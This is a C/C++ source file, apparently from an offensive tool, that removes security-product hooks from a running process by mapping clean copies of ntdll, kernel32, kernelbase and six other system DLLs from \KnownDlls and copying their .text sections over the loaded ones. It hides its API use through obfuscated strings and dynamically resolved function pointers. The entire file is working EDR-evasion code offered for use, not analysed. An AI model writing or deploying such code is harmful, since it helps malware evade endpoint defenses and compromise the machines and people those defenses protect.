#include "camouflage.h"
#include "Utility.h"
#include "FunctionPtrs.h"
#include <memoryapi.h>
#include "driverInterface.h"


	
static void Map_Dll(OUT PVOID* pBuffer, IN const WCHAR* Knowndll)
{

	HANDLE			   hSection = NULL;
	ULONG					result = 1;
	LPVOID			  dllBuffer = NULL;
	UNICODE_STRING		uniStr = { 0 };
	OBJECT_ATTRIBUTES	objAtr = { 0 };


	uniStr.Buffer = (PWSTR)Knowndll;
	uniStr.Length = (USHORT)wcslen(Knowndll) * sizeof(WCHAR);
	uniStr.MaximumLength = (USHORT)uniStr.Length + sizeof(WCHAR);

	InitializeObjectAttributes(&objAtr, &uniStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

	fnNtOpenSection pNtOpenSection = (fnNtOpenSection)Function_PTR(ToWstring(StringObf("ntdll.dll")), "NtOpenSection");

	if (!NT_SUCCESS(result = pNtOpenSection(&hSection, SECTION_MAP_READ, &objAtr)))
	{
		printf("\033[0;31m[!]\033[0mNtOpenSection Failed With Error : 0x%0.8X \n", result);
		return;
	}

	fnMapViewOfFile pMapViewOfFile = (fnMapViewOfFile)Function_PTR(ToWstring(StringObf("KERNEL32.DLL")), "MapViewOfFile");

	dllBuffer = pMapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
	if (!dllBuffer)
	{
		printf_s("\033[0;31m[!]\033[0mFailed To Map File With ERROR : %d\n", GetLastError());
		return;
	}

	*pBuffer = dllBuffer;

	CloseHandle(hSection);
}

static PVOID DLL_Base_Addr(IN const WCHAR* Sys32Dll)
{
	
	PVOID	 Base = NULL;
	DWORD cbNeeded = 0;
	HMODULE lphModule[1024] = { 0 };
	int i = 0, cModules = 0;

	fnK32EnumProcessModules pK32EnumProcessModules = (fnK32EnumProcessModules)Function_PTR(ToWstring(StringObf("KERNEL32.DLL")), "K32EnumProcessModules");
	fnGetModuleFileNameW pGetModuleFileNameW = (fnGetModuleFileNameW)Function_PTR(ToWstring(StringObf("KERNEL32.DLL")), "GetModuleFileNameW");

	if (pK32EnumProcessModules(GetCurrentProcess(), lphModule, sizeof(lphModule), &cbNeeded))
	{

		cModules = cbNeeded / sizeof(lphModule[0]);
		far WCHAR module[MAX_PATH] = { 0 };

		for (; i < cModules; i++)
		{

			pGetModuleFileNameW(lphModule[i], module, MAX_PATH);

			if (RSHasher((PWCHAR)Sys32Dll, module))
			{
				return lphModule[i];
			}
		}
	}
	else
	{
		printf("\033[0;31m[!]\033[0mEnumProcess Modules Failed With Error : %d\n", GetLastError());
		return NULL;
	}
	return NULL;
}

static BOOL Read_Text_Section(IN const WCHAR* KnownDll, IN const WCHAR* Sys32Dll)
{

	SIZE_T					szText = 0;
	PVOID			   localDll = NULL,
		remoteDll = NULL,
		localTextSection = NULL,
		remoteTextSection = NULL;
	LPCVOID		   remoteHeader = NULL;
	PIMAGE_DOS_HEADER	  p_idh = NULL;
	PIMAGE_NT_HEADERS	  p_inh = NULL;
	PIMAGE_SECTION_HEADER p_ish = NULL;



	localDll = (PVOID)DLL_Base_Addr(Sys32Dll);

	if (localDll)
	{
		p_idh = (PIMAGE_DOS_HEADER)localDll;
		if (p_idh->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

		p_inh = (PIMAGE_NT_HEADERS)((LPBYTE)localDll + p_idh->e_lfanew);
		if (p_inh->Signature != IMAGE_NT_SIGNATURE) return FALSE;
	}


	Map_Dll(&remoteDll, KnownDll);
	if (!remoteDll) return FALSE;

	remoteHeader = remoteDll;

	p_ish = IMAGE_FIRST_SECTION(p_inh);

	for (int i = 0; i < p_inh->FileHeader.NumberOfSections; i++)
	{
		if ((*(PULONG)p_ish[i].Name | 0x20202020) == 'xet.')
		{
			localTextSection = C_PTR(((ULONG_PTR)localDll + p_ish[i].VirtualAddress));
			remoteTextSection = C_PTR(((ULONG_PTR)remoteDll + p_ish[i].VirtualAddress));
			szText = p_ish[i].Misc.VirtualSize;
			break;
		}
	}


	if (!localTextSection || !remoteTextSection || szText == 0) return FALSE;

	if (*(PULONG)localTextSection != *(PULONG)remoteTextSection) return FALSE;


	DWORD dwOldProtect = NULL;

	fnVirtualProtect pVirtualProtect = (fnVirtualProtect)Function_PTR(ToWstring(StringObf("KERNEL32.DLL")), "VirtualProtect");

	if (!pVirtualProtect(localTextSection, szText, PAGE_EXECUTE_WRITECOPY, &dwOldProtect)) {
		printf("\033[0;31m[!]\033[0mVirtualProtect [1] Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	memcpy(localTextSection, remoteTextSection, szText);

	if (!pVirtualProtect(localTextSection, szText, dwOldProtect, &dwOldProtect)) {
		printf("\033[0;31m[!]\033[0mVirtualProtect [2] Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}



BOOL UnHook_Dlls(IN int name)
{

	const WCHAR* KnwnDLL{};
	const WCHAR* Sys32DLL{};

	switch (name)
	{
	case 1:
		KnwnDLL = ToWstring(StringObf("\\KnownDlls\\ntdll.dll"));
		Sys32DLL = ToWstring(StringObf("C:\\Windows\\SYSTEM32\\ntdll.dll"));
		break;
	case 2:
		KnwnDLL = ToWstring(StringObf("\\KnownDlls\\kernelbase.dll"));
		Sys32DLL = ToWstring(StringObf("C:\\Windows\\System32\\KERNELBASE.dll"));
		break;
	case 3:
		KnwnDLL = ToWstring(StringObf("\\KnownDlls\\kernel32.dll"));
		Sys32DLL = ToWstring(StringObf("C:\\Windows\\System32\\KERNEL32.DLL"));
		break;
	case 4:
		KnwnDLL = ToWstring(StringObf("\\KnownDlls\\advapi32.dll"));
		Sys32DLL = ToWstring(StringObf("C:\\Windows\\System32\\ADVAPI32.dll"));
		break;
	case 5:
		KnwnDLL = ToWstring(StringObf("\\KnownDlls\\ucrtbase.dll"));
		Sys32DLL = ToWstring(StringObf("C:\\Windows\\System32\\ucrtbase.dll"));
		break;
	case 6:
		KnwnDLL = ToWstring(StringObf("\\KnownDlls\\user32.dll"));
		Sys32DLL = ToWstring(StringObf("C:\\Windows\\System32\\USER32.dll"));
		break;
	case 7:
		KnwnDLL = ToWstring(StringObf("\\KnownDlls\\sechost.dll"));
		Sys32DLL = ToWstring(StringObf("C:\\Windows\\System32\\sechost.dll"));
		break;
	case 8:
		KnwnDLL = ToWstring(StringObf("\\KnownDlls\\IMM32.dll"));
		Sys32DLL = ToWstring(StringObf("C:\\Windows\\System32\\IMM32.DLL"));
		break;
	case 9:
		KnwnDLL = ToWstring(StringObf("\\KnownDlls\\msvcp_win.dll"));
		Sys32DLL = ToWstring(StringObf("C:\\Windows\\System32\\msvcp_win.dll"));
		break;
	}

	if (Read_Text_Section(KnwnDLL, Sys32DLL)) return TRUE;

	return FALSE;
}

